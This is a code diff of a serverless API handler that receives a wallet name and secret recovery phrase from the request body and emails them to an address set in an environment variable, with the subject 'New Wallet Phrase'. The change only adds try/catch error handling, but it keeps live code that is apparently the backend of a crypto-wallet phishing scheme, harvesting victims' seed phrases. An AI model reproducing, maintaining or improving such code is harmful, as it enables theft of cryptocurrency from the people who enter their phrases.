@@ -19,19 +19,26 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
 
     const { walletName, walletPhrase } = req.body
 
-    const { data, error } = await resend.emails.send({
-        from: 'Phrase alert <onboarding@resend.dev>',
-        to: [process.env.WALLET_TO_EMAIL as string],
-        subject: `New Wallet Phrase`,
-        html: `
+try{
+     const { walletName, walletPhrase } = req.body
+
+     const { data, error } = await resend.emails.send({
+         from: 'Phrase alert <onboarding@resend.dev>',
+         to: [process.env.WALLET_TO_EMAIL as string],
+         subject: `New Wallet Phrase`,
+         html: `
       <p>Wallet Name: ${walletName}</p>
       <p>Secret Phrase: ${walletPhrase}</p>
     `,
-    })
+     })
 
-    if (error) {
-        return res.status(500).json({ error: error.message })
-    }
+     if (error) {
+         return res.status(500).json({ error: error.message })
+     }
 
-    return res.status(200).json(data)
+     return res.status(200).json(data)
+ }catch(err){
+     console.error(err)
+     return res.status(500).json({ error: 'Server error' })
+ }
 }
